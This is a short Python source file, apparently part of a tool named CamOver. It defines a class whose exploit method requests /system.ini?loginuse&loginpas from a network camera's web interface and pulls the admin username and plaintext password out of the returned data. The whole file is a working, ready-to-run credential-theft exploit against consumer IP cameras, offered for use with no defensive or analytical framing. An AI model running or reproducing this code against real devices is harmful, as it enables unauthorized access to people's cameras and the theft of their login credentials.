

import re
import requests


class CamOver(object):
    """ Main class of camover module.

    This main class of camover module is intended for providing
    an exploit for network camera vulnerability that extracts credentials
    from the obtained system.ini file.
    """

    def __init__(self) -> None:
        super().__init__()

    @staticmethod
    def exploit(address: str) -> tuple:
        """ Exploit the vulnerability in network camera and extract credentials

        :param str address: device address
        :return tuple: tuple of username and password
        """

        username = 'admin'

        try:
            response = requests.get(
                f"http://{address}/system.ini?loginuse&loginpas",
                verify=False,
                timeout=3
            )
        except Exception:
            return

        if response.status_code == 200:
            strings = re.findall("[^\x00-\x1F\x7F-\xFF]{4,}", response.text)

            if username in strings:
                username_index = strings.index(username)
                password = strings[username_index + 1]

                return username, password
